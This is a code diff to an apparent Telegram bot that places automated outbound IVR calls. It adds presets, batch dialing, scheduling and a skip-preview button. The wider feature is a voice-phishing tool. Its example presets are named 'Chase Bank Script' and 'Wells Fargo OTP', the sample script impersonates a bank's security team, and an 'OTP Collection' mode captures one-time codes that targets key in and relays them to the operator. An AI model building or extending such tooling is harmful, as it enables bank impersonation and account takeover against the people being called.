@@ -2495,6 +2495,21 @@ bot?.on('callback_query', async (query) => {
     const data = query?.data || ''
     const chatId = query?.message?.chat?.id
 
+    // ── Save Preset handler (#1 Quick Dial Presets) ──
+    if (chatId && data.startsWith('save_preset:')) {
+      try { await bot.answerCallbackQuery(query.id) } catch (e) { /* ignore */ }
+      const info = await state.findOne({ _id: parseFloat(chatId) })
+      const ivrObData = info?.ivrObData || {}
+      // Save current call config as preset — ask for name
+      await set(state, chatId, 'action', 'ivrObPresetName')
+      try {
+        await bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: '💾 Saving...', callback_data: 'noop' }]] },
+          { chat_id: chatId, message_id: query.message.message_id })
+      } catch (e) { /* ignore */ }
+      return bot.sendMessage(chatId, `💾 <b>Save Preset</b>\n\nEnter a name for this preset:\n<i>Example: "Chase Bank Script", "Wells Fargo OTP"</i>`, { parse_mode: 'HTML' }).catch(() => {})
+    }
+
+
     // ── IVR Redial handler (Business plan only) ──
     if (chatId && data.startsWith('ivr_redial:')) {
       try { await bot.answerCallbackQuery(query.id) } catch (e) { /* ignore */ }
@@ -3784,6 +3799,8 @@ bot?.on('message', msg => {
     ivrObOtpMessages: 'ivrObOtpMessages',
     ivrObOtpConfirmMsg: 'ivrObOtpConfirmMsg',
     ivrObOtpRejectMsg: 'ivrObOtpRejectMsg',
+    ivrObPresetName: 'ivrObPresetName',
+    ivrObBatchTargets: 'ivrObBatchTargets',
 
     // Bulk IVR Campaign
     bulkSelectCaller: 'bulkSelectCaller',
@@ -14508,12 +14525,55 @@ Please enter valid nameservers (e.g. ns1.example.com), one per line.`), { parse_
         return send(chatId, phoneConfig.upgradeMessage('ivrOutbound', currentPlan, info?.userLanguage), k.of([]))
       }
 
-      // Subscriber with eligible plan — select caller ID (only show numbers with Pro+ plan)
+      // Subscriber with eligible plan — show Quick IVR menu with presets + recent
       const eligibleNumbers = numbers.filter(n => phoneConfig.canAccessFeature(n.plan, 'ivrOutbound'))
+      const ivrPrefs = info?.ivrPrefs || {}
+
+      // Load user's presets
+      const presets = info?.ivrPresets || []
+      // Load recent calls from phoneLogs
+      let recentCalls = []
+      try {
+        recentCalls = await db.collection('phoneLogs').find({
+          chatId: parseFloat(chatId),
+          type: { $in: ['ivr_outbound', 'ivr_call'] },
+        }).sort({ timestamp: -1 }).limit(5).toArray()
+        // Dedupe by target number
+        const seen = new Set()
+        recentCalls = recentCalls.filter(r => { if (seen.has(r.to)) return false; seen.add(r.to); return true }).slice(0, 5)
+      } catch (e) { /* ignore */ }
+
+      // Build menu
+      let menuText = `📢 <b>Quick IVR Call</b>\n\nCall a single number with an automated IVR message.\n`
+      const menuRows = []
+
+      if (presets.length > 0) {
+        menuText += `\n💾 <b>Saved Presets:</b>\n`
+        presets.forEach((p, i) => {
+          menuText += `${i + 1}. ${p.name} (${p.templateName || 'Custom'})\n`
+          menuRows.push([`💾 ${p.name}`])
+        })
+      }
+
+      if (recentCalls.length > 0) {
+        menuText += `\n📋 <b>Recent:</b>\n`
+        recentCalls.forEach(r => {
+          menuRows.push([`📋 ${r.to}`])
+        })
+      }
+
+      menuRows.push(['📞 New Call'])
+      if (presets.length > 0) menuRows.push(['🗑️ Delete Preset'])
+
       await set(state, chatId, 'action', a.ivrObSelectCallerId)
       await saveInfo('ivrObData', { isTrial: false })
-      const rows = eligibleNumbers.map(n => [n.phoneNumber])
-      return send(chatId, `📢 <b>Quick IVR Call</b>\n\nCall a single number with an automated IVR message.\n\nSelect the number to call FROM (Caller ID):`, k.of(rows))
+
+      // If only one eligible number, auto-select it for presets/recent
+      if (eligibleNumbers.length === 1) {
+        menuText += `\n📱 Caller ID: <b>${eligibleNumbers[0].phoneNumber}</b>`
+      }
+
+      return send(chatId, menuText, k.of(menuRows))
     }
     if (message === pc.sipSettings) {
       return send(chatId, cpTxt.softphoneGuide(phoneConfig.SIP_DOMAIN), k.of([]))
@@ -14622,15 +14682,90 @@ Please enter valid nameservers (e.g. ns1.example.com), one per line.`), { parse_
     if (message === 'Cancel' || message === t.cancel || message === t.back) return goto.submenu5()
     const userData = await get(phoneNumbersOf, chatId)
     const numbers = (userData?.numbers || []).filter(n => n.status === 'active')
+    const eligibleNumbers = numbers.filter(n => phoneConfig.canAccessFeature(n.plan, 'ivrOutbound'))
+    const ivrObData = info?.ivrObData || {}
+
+    // ── Handle "New Call" → show caller ID selection ──
+    if (message === '📞 New Call') {
+      const rows = eligibleNumbers.map(n => [n.phoneNumber])
+      return send(chatId, `📞 <b>New IVR Call</b>\n\nSelect the number to call FROM (Caller ID):`, k.of([...rows, ['↩️ Back']]))
+    }
+
+    // ── Handle "Delete Preset" ──
+    if (message === '🗑️ Delete Preset') {
+      const presets = info?.ivrPresets || []
+      if (presets.length === 0) return send(chatId, `No presets to delete.`)
+      const rows = presets.map(p => [`❌ ${p.name}`])
+      rows.push(['↩️ Back'])
+      return send(chatId, `🗑️ <b>Delete Preset</b>\n\nSelect a preset to delete:`, k.of(rows))
+    }
+
+    // ── Handle delete preset selection ──
+    if (message.startsWith('❌ ')) {
+      const presetName = message.replace('❌ ', '')
+      let presets = info?.ivrPresets || []
+      presets = presets.filter(p => p.name !== presetName)
+      await saveInfo('ivrPresets', presets)
+      return send(chatId, `✅ Preset "${presetName}" deleted.`, k.of([['📞 New Call'], ['↩️ Back']]))
+    }
+
+    // ── Handle Preset selection ──
+    if (message.startsWith('💾 ')) {
+      const presetName = message.replace('💾 ', '')
+      const presets = info?.ivrPresets || []
+      const preset = presets.find(p => p.name === presetName)
+      if (!preset) return send(chatId, `Preset not found.`, k.of([['📞 New Call']]))
+      // Load preset into ivrObData
+      Object.assign(ivrObData, {
+        callerId: preset.callerId,
+        callerProvider: preset.callerProvider,
+        callerPlan: preset.callerPlan,
+        templateName: preset.templateName,
+        scriptText: preset.scriptText,
+        placeholderValues: preset.placeholderValues,
+        activeKeys: preset.activeKeys,
+        ivrMode: preset.ivrMode,
+        otpLength: preset.otpLength,
+        otpMaxAttempts: preset.otpMaxAttempts,
+        otpConfirmMsg: preset.otpConfirmMsg,
+        otpRejectMsg: preset.otpRejectMsg,
+        audioUrl: preset.audioUrl,
+        isTrial: false,
+        fromPreset: true,
+      })
+      await saveInfo('ivrObData', ivrObData)
+      await set(state, chatId, 'action', a.ivrObEnterTarget)
+      return send(chatId, `💾 <b>Loaded Preset: ${presetName}</b>\n📱 From: ${preset.callerId}\n🏢 Template: ${preset.templateName || 'Custom'}\n🎙 Voice: ${preset.voiceName || 'default'}\n\nEnter the number to call (or multiple separated by commas):\n<i>Example: +12025551234</i>\n<i>Batch: +12025551234, +12025555678</i>`, k.of([]))
+    }
+
+    // ── Handle Recent call selection ──
+    if (message.startsWith('📋 ')) {
+      const recentNumber = message.replace('📋 ', '').trim()
+      // Auto-select first eligible number as caller ID
+      if (eligibleNumbers.length === 0) return send(chatId, 'No eligible caller ID found.')
+      const caller = eligibleNumbers[0]
+      ivrObData.callerId = caller.phoneNumber
+      ivrObData.callerProvider = caller.provider || 'telnyx'
+      ivrObData.callerPlan = caller.plan || 'starter'
+      ivrObData.targetNumber = recentNumber
+      await saveInfo('ivrObData', ivrObData)
+      // Jump to template selection
+      await set(state, chatId, 'action', a.ivrObSelectCategory)
+      const ivrOb = require('./ivr-outbound.js')
+      const catBtns = ivrOb.getCategoryButtons()
+      const rows = catBtns.map(b => [b])
+      return send(chatId, `📱 From: <b>${caller.phoneNumber}</b>\n📞 To: <b>${recentNumber}</b>\n\nChoose an IVR template category:`, k.of(rows))
+    }
+
+    // ── Normal caller ID selection ──
     const found = numbers.find(n => n.phoneNumber === message)
     if (!found) return send(chatId, `Please select a valid number from the list.`)
-    const ivrObData = info?.ivrObData || {}
     ivrObData.callerId = found.phoneNumber
     ivrObData.callerProvider = found.provider || 'telnyx'
     ivrObData.callerPlan = found.plan || 'starter'
     await saveInfo('ivrObData', ivrObData)
     await set(state, chatId, 'action', a.ivrObEnterTarget)
-    return send(chatId, `📱 Caller ID: <b>${found.phoneNumber}</b>\n\nEnter the phone number to call (with country code):\n<i>Example: +12025551234</i>`, k.of([]))
+    return send(chatId, `📱 Caller ID: <b>${found.phoneNumber}</b>\n\nEnter the phone number to call (or multiple separated by commas):\n<i>Example: +12025551234</i>\n<i>Batch: +12025551234, +12025555678</i>`, k.of([]))
   }
 
   if (action === a.ivrObEnterTarget) {
@@ -14646,12 +14781,31 @@ Please enter valid nameservers (e.g. ns1.example.com), one per line.`), { parse_
       const rows = numBtns.map(n => [n])
       return send(chatId, `📢 <b>Quick IVR Call</b>\n\nCall a single number with an automated IVR message.\n\nSelect the number to call FROM (Caller ID):`, k.of(rows))
     }
-    const clean = message.replace(/[^+\d]/g, '')
-    if (!clean.match(/^\+\d{10,15}$/)) {
-      return send(chatId, `Please enter a valid phone number starting with + and 10-15 digits.\n<i>Example: +12025551234</i>`, k.of([]))
+    const clean = message.replace(/[^+\d,\s]/g, '')
+    // Check for batch numbers (comma-separated)
+    const rawNumbers = clean.split(/[,\s]+/).map(n => n.trim().replace(/[^+\d]/g, '')).filter(n => n.match(/^\+\d{10,15}$/))
+    if (rawNumbers.length === 0) {
+      return send(chatId, `Please enter a valid phone number starting with + and 10-15 digits.\n<i>Example: +12025551234</i>\n<i>Batch: +12025551234, +12025555678</i>`, k.of([]))
     }
+
     const ivrObData = info?.ivrObData || {}
-    ivrObData.targetNumber = clean
+
+    // Batch mode: store all targets
+    if (rawNumbers.length > 1) {
+      ivrObData.batchTargets = rawNumbers
+      ivrObData.targetNumber = rawNumbers[0] // primary
+      ivrObData.suggestedName = null
+      await saveInfo('ivrObData', ivrObData)
+      await set(state, chatId, 'action', a.ivrObSelectCategory)
+      const ivrOb = require('./ivr-outbound.js')
+      const catBtns = ivrOb.getCategoryButtons()
+      const rows = catBtns.map(b => [b])
+      return send(chatId, `📞 <b>Batch: ${rawNumbers.length} numbers</b>\n${rawNumbers.map(n => `  • ${n}`).join('\n')}\n\nChoose an IVR template category:`, k.of(rows))
+    }
+
+    // Single number mode
+    ivrObData.targetNumber = rawNumbers[0]
+    ivrObData.batchTargets = null
     ivrObData.suggestedName = null
 
     // CNAM lookup for US/CA numbers (+1)
@@ -14674,21 +14828,25 @@ Please enter valid nameservers (e.g. ns1.example.com), one per line.`), { parse_
     }
 
     await saveInfo('ivrObData', ivrObData)
+
+    // ── Preset shortcut: if loaded from preset, skip template/placeholder/voice setup ──
+    if (ivrObData.fromPreset && ivrObData.audioUrl) {
+      await set(state, chatId, 'action', a.ivrObCallPreview)
+      const ivrOb = require('./ivr-outbound.js')
+      send(chatId, ivrOb.formatCallPreview(ivrObData))
+      return send(chatId, `💾 <b>Preset loaded — Ready to call!</b>\n\nPress <b>/yes</b> to call or <b>/cancel</b> to abort.`)
+    }
+
     await set(state, chatId, 'action', a.ivrObSelectCategory)
+    // Show categories with "Custom Script" shortcut at top (#7 Flatten template selection)
     const ivrOb = require('./ivr-outbound.js')
     const catBtns = ivrOb.getCategoryButtons()
-    const rows = catBtns.map(b => [b])
-    return send(chatId, ({ en: `📞 Target: <b>${clean}</b>
-
-Choose an IVR template category:`, fr: `📞 Cible : <b>${clean}</b>
-
-Choisissez une catégorie de modèle IVR :`, zh: `📞 目标：<b>${clean}</b>
-
-选择 IVR 模板分类：`, hi: `📞 लक्ष्य: <b>${clean}</b>
-
-IVR टेम्पलेट श्रेणी चुनें:` }[lang] || `📞 Target: <b>${clean}</b>
-
-Choose an IVR template category:`), k.of(rows))
+    const rows = [['✍️ Custom Script']]
+    // Show last-used template category at top if available
+    const lastCat = info?.ivrPrefs?.lastCategory
+    if (lastCat) rows.push([`⭐ Last: ${lastCat}`])
+    rows.push(...catBtns.map(b => [b]))
+    return send(chatId, ({ en: `📞 Target: <b>${ivrObData.targetNumber}</b>\n\nChoose template or write your own:` }[lang] || `📞 Target: <b>${ivrObData.targetNumber}</b>\n\nChoose template or write your own:`), k.of(rows))
   }
 
   if (action === a.ivrObSelectCategory) {
@@ -14699,6 +14857,32 @@ Choose an IVR template category:`), k.of(rows))
       return send(chatId, `Enter the phone number to call (with country code):\n<i>Example: +12025551234</i>`, k.of([]))
     }
     const ivrOb = require('./ivr-outbound.js')
+
+    // "✍️ Custom Script" shortcut (#7 Flatten)
+    if (message === '✍️ Custom Script') {
+      const ivrObData = info?.ivrObData || {}
+      ivrObData.category = 'custom'
+      await saveInfo('ivrObData', ivrObData)
+      await set(state, chatId, 'action', a.ivrObCustomScript)
+      return send(chatId, `✍️ <b>Custom Script</b>\n\nType your IVR message. Use <b>[Brackets]</b> for variables:\n\n<b>Standard:</b> [Name], [Company], [Bank], [Amount]\n<b>Smart (auto-fill):</b> [CardLast4], [CaseID], [ReferenceNum]\n<b>Smart (pick):</b> [Reason], [Location], [CallBack]\n\n<i>Example: Hello [Name]. This is [Bank] security. A charge of $[Amount] was made on card ending [CardLast4]. Case [CaseID]. Press 1 to dispute.</i>\n\nType your script:`, k.of([['ℹ️ All Placeholders']]))
+    }
+
+    // "⭐ Last:" shortcut (#7 Flatten)
+    if (message.startsWith('⭐ Last: ')) {
+      const lastCatName = message.replace('⭐ Last: ', '')
+      const lastCat = ivrOb.getCategoryByButton(lastCatName)
+      if (lastCat) {
+        const ivrObData = info?.ivrObData || {}
+        ivrObData.category = lastCat
+        await saveInfo('ivrObData', ivrObData)
+        await set(state, chatId, 'action', a.ivrObSelectTemplate)
+        const tmplBtns = ivrOb.getTemplateButtons(lastCat)
+        const rows = tmplBtns.map(b => [b])
+        rows.push(['↩️ Back'])
+        return send(chatId, `Select a template:`, k.of(rows))
+      }
+    }
+
     const cat = ivrOb.getCategoryByButton(message)
     if (!cat) return send(chatId, `Please select a category from the buttons.`)
     const ivrObData = info?.ivrObData || {}
@@ -14713,6 +14897,8 @@ Choose an IVR template category:`), k.of(rows))
 
     ivrObData.category = cat
     await saveInfo('ivrObData', ivrObData)
+    // Save last category for quick access (#7)
+    await saveInfo('ivrPrefs', { ...info?.ivrPrefs, lastCategory: message })
     await set(state, chatId, 'action', a.ivrObSelectTemplate)
     const tmplBtns = ivrOb.getTemplateButtons(cat)
     const rows = tmplBtns.map(b => [b])
@@ -14812,10 +14998,15 @@ Choose an IVR template category:`), k.of(rows))
         // type === 'input'
         return send(chatId, `${sp.icon} <b>[${firstPh}]</b> — ${sp.description}\n\n<i>${sp.hint || `Enter value for [${firstPh}]`}</i>`, k.of([]))
       }
-      // Standard placeholder
+      // Standard placeholder — show last-used value as suggestion (#3 Auto-suggest)
+      const lastPlaceholders = info?.ivrLastPlaceholders || {}
+      const lastVal = lastPlaceholders[firstPh]
       if (firstPh === 'Name' && ivrObData.suggestedName) {
         rows.push([ivrObData.suggestedName])
+        if (lastVal && lastVal !== ivrObData.suggestedName) rows.push([`📌 ${lastVal}`])
         rows.push(['Dear Customer'])
+      } else if (lastVal) {
+        rows.push([`📌 ${lastVal}`])
       }
       return send(chatId, `Enter value for <b>[${firstPh}]</b>:`, k.of(rows))
     }
@@ -14909,6 +15100,10 @@ Choose an IVR template category:`), k.of(rows))
     const currentPh = placeholders[idx]
     const sp = currentPh ? ivrOb.getSmartPlaceholder(currentPh) : null
 
+    // Strip "📌 " prefix from auto-suggested values (#3 Auto-suggest)
+    if (message.startsWith('📌 ')) message = message.replace('📌 ', '')
+
+
     // Handle "🔄 Regenerate" for auto-generated placeholders
     if (message === '🔄 Regenerate' && sp?.type === 'auto') {
       const generated = ivrOb.generatePlaceholderValue(currentPh)
@@ -14978,17 +15173,28 @@ Choose an IVR template category:`), k.of(rows))
           return send(chatId, `✅ ${currentPh}: <b>${value}</b>\n\n${nextSp.icon} <b>[${nextPh}]</b> — ${nextSp.description}\n\n<i>${nextSp.hint || `Enter value for [${nextPh}]`}</i>`, k.of([]))
         }
 
-        // Standard placeholder
+        // Standard placeholder — with auto-suggest (#3)
         const rows = []
+        const lastPlaceholders2 = info?.ivrLastPlaceholders || {}
+        const lastVal2 = lastPlaceholders2[nextPh]
         if (nextPh === 'Name' && ivrObData.suggestedName) {
           rows.push([ivrObData.suggestedName])
+          if (lastVal2 && lastVal2 !== ivrObData.suggestedName) rows.push([`📌 ${lastVal2}`])
           rows.push(['Dear Customer'])
+        } else if (lastVal2) {
+          rows.push([`📌 ${lastVal2}`])
         }
         return send(chatId, `✅ ${currentPh}: <b>${value}</b>\n\nEnter value for <b>[${nextPh}]</b>:`, k.of(rows))
       }
     }
 
-    // All placeholders filled — go to mode selection
+    // All placeholders filled — save last-used values (#3 Auto-suggest)
+    const lastPlaceholders = info?.ivrLastPlaceholders || {}
+    const allValues = ivrObData.placeholderValues || {}
+    Object.assign(lastPlaceholders, allValues)
+    await saveInfo('ivrLastPlaceholders', lastPlaceholders)
+
+    // Go to mode selection
     await set(state, chatId, 'action', a.ivrObSelectMode)
     return send(chatId, `✅ All values set!\n\n📋 <b>Select Call Mode</b>\n\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\n🔑 <b>OTP Collection</b> — Prompt target for a code, you verify via Telegram\n\nBoth modes report full results.`, k.of([['🔗 Transfer'], ['🔑 OTP Collection'], ['↩️ Back']]))
   }
@@ -15182,6 +15388,9 @@ Choose an IVR template category:`), k.of(rows))
     await set(state, chatId, 'action', a.ivrObSelectVoice)
     const voiceBtns = ttsService.getVoiceButtons('en', providerKey)
     const rows = []
+    // Show last-used voice at top (#4 Remember preferences)
+    const lastVoice = info?.ivrPrefs?.voiceName
+    if (lastVoice) rows.push([`⭐ Last: ${lastVoice}`])
     for (let i = 0; i < voiceBtns.length; i += 2) {
       rows.push(voiceBtns.slice(i, i + 2))
     }
@@ -15198,16 +15407,25 @@ Choose an IVR template category:`), k.of(rows))
       return send(chatId, `🎙 <b>Select Voice Provider</b>\n\nChoose your TTS engine:`, k.of(providerBtns))
     }
     const ttsService = require('./tts-service.js')
-    const voiceKey = ttsService.getVoiceKeyByButton(message)
+    // Handle "⭐ Last: voiceName" shortcut
+    let voiceKey = null
+    if (message.startsWith('⭐ Last: ')) {
+      const lastVoiceName = message.replace('⭐ Last: ', '')
+      voiceKey = Object.keys(ttsService.VOICES).find(k => ttsService.VOICES[k].name === lastVoiceName) || ttsService.getVoiceKeyByButton(message)
+    } else {
+      voiceKey = ttsService.getVoiceKeyByButton(message)
+    }
     const voice = ttsService.VOICES[voiceKey] || ttsService.VOICES[ttsService.DEFAULT_VOICE]
     const ivrObData = info?.ivrObData || {}
     ivrObData.voiceKey = voiceKey
     ivrObData.voiceName = voice.name
     await saveInfo('ivrObData', ivrObData)
 
-    // Go to speed selection
+    // Go to speed selection — show last-used speed preference (#4)
     await set(state, chatId, 'action', a.ivrObSelectSpeed)
     const speedBtns = ttsService.getSpeedButtons().map(b => [b])
+    const lastSpeed = info?.ivrPrefs?.speedLabel
+    if (lastSpeed) speedBtns.unshift([`⭐ Last: ${lastSpeed}`])
     speedBtns.push(['✍️ Custom Speed'])
     return send(chatId, `🎤 Voice: <b>${voice.name}</b>\n\n🎚 <b>Select Speaking Speed</b>\n\nChoose how fast the voice speaks:`, k.of(speedBtns))
   }
@@ -15232,12 +15450,15 @@ Choose an IVR template category:`), k.of(rows))
     }
 
     let speed = 1.0
+    let speedLabel = 'Normal'
     if (ivrObData._awaitingCustomSpeed) {
       // Parse custom speed value
       if (message === '↩️ Back') {
         delete ivrObData._awaitingCustomSpeed
         await saveInfo('ivrObData', ivrObData)
         const speedBtns = ttsService.getSpeedButtons().map(b => [b])
+        const lastSpeed2 = info?.ivrPrefs?.speedLabel
+        if (lastSpeed2) speedBtns.unshift([`⭐ Last: ${lastSpeed2}`])
         speedBtns.push(['✍️ Custom Speed'])
         return send(chatId, `🎚 <b>Select Speaking Speed</b>:`, k.of(speedBtns))
       }
@@ -15246,7 +15467,12 @@ Choose an IVR template category:`), k.of(rows))
         return send(chatId, `❌ Invalid speed. Enter a number between <b>0.25</b> and <b>4.0</b>:\n<i>Example: 0.8 or 1.3</i>`, k.of([['↩️ Back']]))
       }
       speed = parsed
+      speedLabel = `${speed}x`
       delete ivrObData._awaitingCustomSpeed
+    } else if (message.startsWith('⭐ Last: ')) {
+      // Use last-used speed preference (#4)
+      speedLabel = message.replace('⭐ Last: ', '')
+      speed = info?.ivrPrefs?.speed || 1.0
     } else {
       // Parse from preset button
       const preset = ttsService.getSpeedByButton(message)
@@ -15256,15 +15482,25 @@ Choose an IVR template category:`), k.of(rows))
         return send(chatId, `Please select a speed from the buttons:`, k.of(speedBtns))
       }
       speed = preset.rate
+      speedLabel = preset.label || `${speed}x`
     }
 
     ivrObData.ttsSpeed = speed
     await saveInfo('ivrObData', ivrObData)
 
+    // Save voice/speed preferences (#4 Remember preferences)
+    await saveInfo('ivrPrefs', {
+      voiceName: ivrObData.voiceName,
+      voiceKey: ivrObData.voiceKey,
+      ttsProvider: ivrObData.ttsProvider,
+      speed,
+      speedLabel,
+    })
+
     // Generate audio preview
     await set(state, chatId, 'action', a.ivrObAudioPreview)
-    const speedLabel = speed === 1.0 ? 'Normal' : `${speed}x`
-    send(chatId, `🎤 Voice: <b>${ivrObData.voiceName}</b> | 🎚 Speed: <b>${speedLabel}</b>\n\n⏳ Generating audio preview...`)
+    const speedLabelDisplay = speed === 1.0 ? 'Normal' : `${speed}x`
+    send(chatId, `🎤 Voice: <b>${ivrObData.voiceName}</b> | 🎚 Speed: <b>${speedLabelDisplay}</b>\n\n⏳ Generating audio preview...`)
 
     try {
       const ivrOb = require('./ivr-outbound.js')
@@ -15283,7 +15519,7 @@ Choose an IVR template category:`), k.of(rows))
 
       // Send audio preview with action keyboard attached (avoids slow separate keyboard message)
       const speedLabel = speed === 1.0 ? 'Normal' : `${speed}x`
-      const previewKeyboard = k.of([['✅ Confirm'], ['🎤 Change Voice', '🎚 Change Speed'], [ivrObData.holdMusic ? '🎵 Hold Music: ON' : '🔇 Hold Music: OFF']])
+      const previewKeyboard = k.of([['✅ Confirm', '⏭ Skip & Call'], ['🎤 Change Voice', '🎚 Change Speed'], [ivrObData.holdMusic ? '🎵 Hold Music: ON' : '🔇 Hold Music: OFF']])
       await bot.sendAudio(chatId, result.audioPath, {
         caption: `🔊 <b>Audio Preview</b> | 🎚 Speed: <b>${speedLabel}</b>\n\nListen to the IVR message that will play to the call receiver.\n\nHappy with it? Tap <b>✅ Confirm</b> to proceed.\nWant a different voice? Tap <b>🎤 Change Voice</b>.\nAdjust speed? Tap <b>🎚 Change Speed</b>.${fallbackNote}`,
         parse_mode: 'HTML',
@@ -15324,7 +15560,15 @@ Choose an IVR template category:`), k.of(rows))
       ivrObData.holdMusic = !ivrObData.holdMusic
       await saveInfo('ivrObData', ivrObData)
       send(chatId, `🎵 Hold Music: <b>${ivrObData.holdMusic ? 'ON' : 'OFF'}</b>\n${ivrObData.holdMusic ? 'Target will hear "Please hold" + music before transfer.' : 'Target hears standard ringback during transfer.'}`, { parse_mode: 'HTML' })
-      return send(chatId, `What would you like to do?`, k.of([['✅ Confirm'], ['🎤 Change Voice', '🎚 Change Speed'], [ivrObData.holdMusic ? '🎵 Hold Music: ON' : '🔇 Hold Music: OFF']]))
+      return send(chatId, `What would you like to do?`, k.of([['✅ Confirm', '⏭ Skip & Call'], ['🎤 Change Voice', '🎚 Change Speed'], [ivrObData.holdMusic ? '🎵 Hold Music: ON' : '🔇 Hold Music: OFF']]))
+    }
+    // ── "⏭ Skip & Call" — bypass preview confirmation, go straight to calling (#6) ──
+    if (message === '⏭ Skip & Call') {
+      const ivrObData = info?.ivrObData || {}
+      if (!ivrObData.audioUrl) return send(chatId, `Audio not ready. Please tap ✅ Confirm instead.`)
+      // Jump straight to call execution (same as /yes in ivrObCallPreview)
+      await set(state, chatId, 'action', a.ivrObStart)
+      send(chatId, `⏭ <b>Skipping preview — Placing call...</b>`)
     }
     if (message === '✅ Confirm') {
       // Show call preview
@@ -15332,7 +15576,7 @@ Choose an IVR template category:`), k.of(rows))
       const ivrObData = info?.ivrObData || {}
       await set(state, chatId, 'action', a.ivrObCallPreview)
       const preview = ivrOb.formatCallPreview(ivrObData)
-      return send(chatId, preview, k.of([['/yes']]))
+      return send(chatId, preview, k.of([['/yes', '🕐 Schedule']]))
     }
     return send(chatId, `Tap <b>✅ Confirm</b> to proceed, <b>🎤 Change Voice</b>, or <b>Back</b>.`, k.of([['✅ Confirm'], ['🎤 Change Voice'], [(info?.ivrObData?.holdMusic) ? '🎵 Hold Music: ON' : '🔇 Hold Music: OFF']]))
   }
@@ -15345,6 +15589,29 @@ Choose an IVR template category:`), k.of(rows))
       const ivrObData = info?.ivrObData || {}
       return send(chatId, `What would you like to do?`, k.of([['✅ Confirm'], ['🎤 Change Voice'], [ivrObData.holdMusic ? '🎵 Hold Music: ON' : '🔇 Hold Music: OFF']]))
     }
+    // ── Schedule Call (#10) ──
+    if (message === '🕐 Schedule') {
+      const ivrObData = info?.ivrObData || {}
+      return send(chatId, `🕐 <b>Schedule Call</b>\n\nHow many minutes from now should the call go out?\n\n<i>Examples: 5, 15, 30, 60</i>`, k.of([['5 min', '15 min', '30 min'], ['60 min', '120 min'], ['↩️ Back']]))
+    }
+    // Handle schedule time entry
+    if (message.match(/^(\d+)\s*min/i)) {
+      const minutes = parseInt(message)
+      if (minutes < 1 || minutes > 1440) return send(chatId, `Please enter between 1 and 1440 minutes.`)
+      const ivrObData = info?.ivrObData || {}
+      const scheduledAt = new Date(Date.now() + minutes * 60 * 1000)
+      // Store scheduled call in DB
+      await db.collection('scheduledCalls').insertOne({
+        chatId: parseFloat(chatId),
+        ivrObData: { ...ivrObData },
+        scheduledAt,
+        status: 'pending',
+        createdAt: new Date(),
+      })
+      await set(state, chatId, 'action', a.submenu5)
+      return send(chatId, `✅ <b>Call Scheduled!</b>\n\n📞 To: ${ivrObData.targetNumber}\n🕐 In: ${minutes} minutes (${scheduledAt.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' })} UTC)\n\nYou'll be notified when the call is placed.`)
+    }
+
     if (message === '/yes') {
       const ivrObData = info?.ivrObData || {}
       const voiceService = require('./voice-service.js')
@@ -15421,6 +15688,46 @@ Choose an IVR template category:`), k.of(rows))
         return goto.submenu5()
       }
 
+      // ── Batch mode: queue remaining numbers (#5) ──
+      const batchTargets = ivrObData.batchTargets || []
+      if (batchTargets.length > 1) {
+        const remaining = batchTargets.slice(1)
+        let batchCount = 1
+        for (const target of remaining) {
+          // Small delay between calls
+          await new Promise(r => setTimeout(r, 2000))
+          batchCount++
+          send(chatId, `📞 Batch ${batchCount}/${batchTargets.length}: Calling ${target}...`)
+          await voiceService.initiateOutboundIvrCall({
+            chatId, callerId: ivrObData.callerId, targetNumber: target,
+            ivrNumber: ivrObData.ivrNumber, audioUrl: ivrObData.audioUrl,
+            activeKeys: ivrObData.activeKeys, templateName: ivrObData.templateName,
+            placeholderValues: ivrObData.placeholderValues, voiceName: ivrObData.voiceName,
+            isTrial: false, holdMusic: ivrObData.holdMusic || false,
+            provider: callerProvider, twilioSubAccountSid: subAccountSid, twilioSubAccountToken: subAccountToken,
+            ivrMode: ivrObData.ivrMode || 'transfer', otpLength: ivrObData.otpLength || 6,
+            otpMaxAttempts: ivrObData.otpMaxAttempts || 3,
+            otpConfirmMsg: ivrObData.otpConfirmMsg || null, otpRejectMsg: ivrObData.otpRejectMsg || null,
+          }).catch(e => send(chatId, `❌ Batch call to ${target} failed: ${e.message}`))
+        }
+      }
+
+      // ── Offer to save preset (#1 Quick Dial Presets) ──
+      if (!ivrObData.isTrial && !ivrObData.fromPreset) {
+        const presets = info?.ivrPresets || []
+        if (presets.length < 10) {
+          bot?.sendMessage(chatId, `💾 Want to save this as a Quick Dial preset for next time?`, {
+            parse_mode: 'HTML',
+            reply_markup: {
+              inline_keyboard: [[
+                { text: '💾 Save Preset', callback_data: `save_preset:${chatId}` },
+                { text: '❌ No Thanks', callback_data: 'noop' }
+              ]]
+            }
+          }).catch(() => {})
+        }
+      }
+
       // Trial marking moved to voice-service.js handleOutboundIvrHangup
       // — only consumed when the call is actually answered (not on busy/no_answer)
 
@@ -15434,6 +15741,41 @@ Choose an IVR template category:`), k.of(rows))
   // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   // AUDIO LIBRARY — Upload, list, delete audio files
   // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  // ── Save Preset Name handler (#1) ──
+  if (action === a.ivrObPresetName || action === 'ivrObPresetName') {
+    if (message === 'Cancel' || message === t.cancel) return goto.submenu5()
+    const ivrObData = info?.ivrObData || {}
+    const presetName = message.trim().substring(0, 50)
+    let presets = info?.ivrPresets || []
+    // Remove existing preset with same name
+    presets = presets.filter(p => p.name !== presetName)
+    presets.unshift({
+      name: presetName,
+      callerId: ivrObData.callerId,
+      callerProvider: ivrObData.callerProvider,
+      callerPlan: ivrObData.callerPlan,
+      templateName: ivrObData.templateName,
+      scriptText: ivrObData.scriptText,
+      placeholderValues: ivrObData.placeholderValues,
+      activeKeys: ivrObData.activeKeys,
+      ivrMode: ivrObData.ivrMode,
+      otpLength: ivrObData.otpLength,
+      otpMaxAttempts: ivrObData.otpMaxAttempts,
+      otpConfirmMsg: ivrObData.otpConfirmMsg,
+      otpRejectMsg: ivrObData.otpRejectMsg,
+      audioUrl: ivrObData.audioUrl,
+      voiceName: ivrObData.voiceName,
+      holdMusic: ivrObData.holdMusic,
+      savedAt: new Date().toISOString(),
+    })
+    // Keep max 10 presets
+    if (presets.length > 10) presets = presets.slice(0, 10)
+    await saveInfo('ivrPresets', presets)
+    await set(state, chatId, 'action', a.submenu5)
+    return send(chatId, `✅ Preset "<b>${presetName}</b>" saved!\n\nNext time, select it from the Quick IVR menu to skip setup.`, k.of([]))
+  }
+
